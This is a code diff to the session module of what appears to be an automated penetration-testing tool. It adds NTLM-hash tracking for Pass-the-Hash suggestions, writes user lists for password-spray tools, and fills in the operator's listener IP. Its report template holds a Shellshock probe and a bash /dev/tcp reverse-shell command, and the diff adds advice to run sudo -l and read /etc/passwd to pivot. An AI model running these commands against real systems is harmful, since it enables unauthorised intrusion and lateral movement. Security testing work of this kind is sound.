@@ -265,6 +265,9 @@ class TargetInfo:
     # is_domain_controller: True when Kerberos+LDAP ports open, or NXC/enum4linux
     #   output explicitly names this host as a DC
     is_domain_controller: bool           = False
+    # ntlm_hashes_found: True when any module captures NTLM hashes (responder,
+    #   secretsdump, etc.) — triggers Pass-the-Hash templates in the Recommender
+    ntlm_hashes_found:  bool             = False
 
     def add_port(self, port: int, service: str = "", version: str = "",
                  banner: str = "") -> None:
@@ -292,6 +295,7 @@ class TargetInfo:
             "os_type":              self.os_type,
             "os_version":           self.os_version,
             "is_domain_controller": self.is_domain_controller,
+            "ntlm_hashes_found":    self.ntlm_hashes_found,
         }
 
     @classmethod
@@ -310,6 +314,7 @@ class TargetInfo:
         obj.os_type              = data.get("os_type", "")
         obj.os_version           = data.get("os_version", "")
         obj.is_domain_controller = data.get("is_domain_controller", False)
+        obj.ntlm_hashes_found    = data.get("ntlm_hashes_found", False)
         return obj
 
 
@@ -358,11 +363,15 @@ class Session:
         domain:      str  = "",
         output_base: str  = "output/targets",
         verbose:     bool = False,
+        lhost:       str  = "",
+        resume:      bool = False,
     ) -> None:
         self.target      = target
         self.domain      = domain
         self.output_base = Path(output_base)
         self.verbose     = verbose
+        self.lhost       = lhost
+        self.resume      = resume
 
         self.target_dir: Path = self.output_base / target
         self.started_at: str  = datetime.now(timezone.utc).isoformat()
@@ -393,11 +402,25 @@ class Session:
         return base / filename
 
     def save_state(self) -> None:
-        """Persist current TargetInfo to session.json."""
+        """Persist current TargetInfo to session.json.
+
+        Also writes output/targets/<IP>/users.txt whenever users_found is
+        non-empty so spray tools can reference it immediately.
+        """
         state_path = self.target_dir / STATE_FILE
         with state_path.open("w") as fh:
             json.dump(self.info.to_dict(), fh, indent=2)
         self.log.debug("Session state saved → %s", state_path)
+
+        # Auto-write users.txt for spray tools whenever users are known
+        if self.info.users_found:
+            users_path = self.target_dir / "users.txt"
+            users_path.write_text(
+                "\n".join(sorted(set(self.info.users_found))) + "\n",
+                encoding="utf-8",
+            )
+            self.log.debug("users.txt updated (%d users) → %s",
+                           len(self.info.users_found), users_path)
 
     def add_note(self, text: str) -> None:
         """Append a timestamped note to TargetInfo (finalize_notes writes the file)."""
@@ -564,6 +587,10 @@ class Session:
                     f'- [ ] **Comprobar:** `curl -H "User-Agent: () {{ :; }}; echo; /usr/bin/id" {url}`',
                     f'- [ ] Reverse Shell: `curl -H "User-Agent: () {{ :; }}; echo; /bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" {url}`',
                     "",
+                    "> 💡 **TACTICAL NEXT STEP** — You are likely landing as a web service "
+                    "account (e.g., `www-data`). Immediately execute `sudo -l` and check "
+                    "`/etc/passwd` for shell-enabled users to pivot to.",
+                    "",
                 ]
             lines.append("")
 
@@ -676,9 +703,16 @@ class Session:
 
         # ── Arsenal Recommender ───────────────────────────────────────────
         # Import lazily to avoid circular deps at module load time.
+        # Pass lhost so all <LHOST> placeholders in transfer commands are
+        # pre-filled with the operator's tun0 IP (from --lhost flag).
         try:
             from core.advisor import generate_advisor_markdown
-            lines.append(generate_advisor_markdown(self.info))
+            lines.append(
+                generate_advisor_markdown(
+                    self.info,
+                    lhost=self.lhost if self.lhost else "<LHOST>",
+                )
+            )
         except Exception as exc:  # noqa: BLE001
             self.log.warning("Arsenal Recommender failed (non-fatal): %s", exc)
 
@@ -731,13 +765,23 @@ class Session:
     def _load_state(self) -> TargetInfo:
         state_path = self.target_dir / STATE_FILE
         if state_path.exists():
-            try:
-                with state_path.open() as fh:
-                    data = json.load(fh)
-                self.log.info("Resuming previous session for %s", self.target)
-                return TargetInfo.from_dict(data)
-            except (json.JSONDecodeError, KeyError) as exc:
-                self.log.warning(
-                    "Could not load previous state (%s) — starting fresh", exc
+            if self.resume:
+                try:
+                    with state_path.open() as fh:
+                        data = json.load(fh)
+                    self.log.info(
+                        "[*] Resuming session for %s — skipping already-completed modules",
+                        self.target,
+                    )
+                    return TargetInfo.from_dict(data)
+                except (json.JSONDecodeError, KeyError) as exc:
+                    self.log.warning(
+                        "Could not load previous state (%s) — starting fresh", exc
+                    )
+            else:
+                self.log.info(
+                    "session.json found for %s — pass --resume to continue it "
+                    "(starting a fresh scan instead)",
+                    self.target,
                 )
         return TargetInfo(ip=self.target, domain=self.domain)
